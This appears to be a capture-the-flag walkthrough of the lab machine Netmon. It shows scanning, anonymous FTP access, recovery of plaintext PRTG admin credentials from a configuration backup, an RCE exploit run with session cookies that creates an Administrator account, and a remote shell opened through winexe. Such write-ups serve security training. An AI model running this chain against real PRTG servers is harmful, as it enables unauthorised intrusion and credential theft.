# Netmon
## nmap
```
$ nmap 10.10.10.152 --top-ports 1000 --open -sV
```
![](https://i.imgur.com/ohWBicn.png)

It shows open smb service, we can check the probably of smb vulnerability with nmap.

```
$ nmap -v -p 139, 445 --script="smb-vuln-*,samba-vuln-*"  10.10.10.152
```
![](https://i.imgur.com/6qeLyv9.png)

It looks unavailable.
## gobuster
```
$ gobuster -u 10.10.10.152 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
```
![](https://i.imgur.com/uwo1AQt.png)
## http
![](https://i.imgur.com/ggdC9S7.png)

Google it, I found that PRTG has a vulnerabilities:
- PRTG Network Monitor error caused password to be written to the PRTG Configuration.dat file in plain text.

![](https://i.imgur.com/ejmo2Ya.png)

That means we probably get username and password from configuration file.
## ftp
My habit is to try to log in anonymously first.
```
$ ftp 10.10.10.152
Name: anonymous
Password: anonymous
```
![](https://i.imgur.com/h5CiDey.png)

According to the vulnerability discovered by http, I found three configure files in "C:\ProgramData\paessler\PRTG Network Monitor".

![](https://i.imgur.com/YnDDrhF.png)

Download the three files:
```
$ get PRTG\ Configuratin.dat
$ get PRTG\ Configuratin.old
$ get PRTG\ Configuratin.old.bak
```

Finally, I'm find user/password string in the "PRTG Configuratin.old.bak".

```
$ cat "PRTG Configuratin.old.bak"
<!-- User: prtgadmin -->
PrTg@dmin2018
```
## http
Turning attention to the second vulnerability of PRTG:
- PRTG-Network-Monitor-RCE

![](https://i.imgur.com/Uet7N6l.png)

Then we log in website and use burpsuite to interupt request.

![](https://i.imgur.com/Vl1gD4T.png)

Record cookies, try using RCE exploit.
```
$ ./prtg-exploit.sh -u http://10.10.10.152 -c "_ga=GA1.4.66100571.1553662455; _gid=GA1.4.486255060.1553662455; OCTOPUS1813713946=ezAxNUE3MzI1LUQxQUUtNDdDRi04NTkyLTA1NzFENEU2MDdBRn0%3D; _gat=1"
```
![](https://i.imgur.com/NdaC5Is.png)

The exploit was successful, now we have an Administrator account.

The victim machine opened the smb sharing service, so we can use winexe to connect remotely.
```
$ winexe -U pentest%P3nT3st! //10.10.10.152 cmd.exe
```
![](https://i.imgur.com/lTKDFb7.png)
## user
Get user flag:

![](https://i.imgur.com/5xjGgbb.png)
## root
Get root flag:

![](https://i.imgur.com/QuuJszn.png)
